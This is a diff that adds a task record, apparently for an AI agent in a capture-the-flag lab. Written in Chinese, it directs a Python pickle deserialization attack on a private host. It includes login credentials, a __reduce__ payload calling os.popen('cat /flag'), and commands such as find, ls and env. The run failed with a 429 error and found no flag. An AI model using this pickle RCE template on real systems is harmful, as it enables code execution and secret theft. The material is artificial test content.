@@ -1,0 +1,45 @@
+[Task]
+对 http://10.0.162.113:80 进行 Python pickle 反序列化攻击。
+
+已知信息：
+1. 使用 rootadmin/docpass 登录
+2. 登录后获得两个cookie:
+   - session: Flask session token
+   - pref_rootadmin: pickle序列化的base64编码，当前值为 {'theme': 'dark', 'language': 'zh-CN'}
+3. /preferences 页面可以提交偏好设置，会更新pref_rootadmin cookie
+4. 服务端会反序列化pref_rootadmin cookie值
+
+攻击步骤：
+1. 登录获取session cookie
+2. 构造恶意pickle payload，使用 __reduce__ 方法执行系统命令
+3. 先尝试读取flag文件，构造payload执行命令: find / -name "flag*" 2>/dev/null 或 cat /flag 或 ls -la /
+4. 将恶意pickle payload base64编码后设置为pref_rootadmin cookie
+5. 访问任意需要读取偏好的页面触发反序列化
+6. 查看响应中是否有命令执行结果
+
+注意：pickle反序列化RCE的payload构造方式：
+```python
+import pickle
+import os
+import base64
+
+class Exploit(object):
+    def __reduce__(self):
+        return (os.popen, ('cat /flag',))  # 或 (subprocess.check_output, ('cat /flag',))
+```
+
+或者直接构造opcode。先试多种读取方式，如果os.popen不行，试subprocess.check_output。
+
+也尝试先执行 ls / 和 cat /flag.txt 和 cat /flag 以及 env 命令来找到flag。
+
+[Context]
+
+
+[Output]
+
+
+[Stderr]
+# 代码生成失败: 429 Client Error: Too Many Requests for url: http://10.0.0.24/522_npb9c039/chat/completions
+
+[Flag]
+None
